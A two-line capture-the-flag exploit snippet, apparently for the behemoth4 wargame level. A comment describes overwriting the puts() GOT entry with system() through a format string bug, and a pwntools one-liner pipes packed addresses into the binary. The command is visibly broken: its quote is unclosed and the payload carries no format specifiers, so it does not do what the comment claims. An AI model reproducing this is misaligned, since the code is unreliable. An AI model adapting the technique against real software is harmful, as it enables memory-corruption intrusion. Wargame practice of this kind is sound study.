# re2libc by overwriting puts() GOT entry with address of system(), exploiting a format string vulnerability
python -c 'from pwn import *; print(p32(0x80497ae)+p32(0x80497ac)+p32(0x804857e) | ./behemoth4
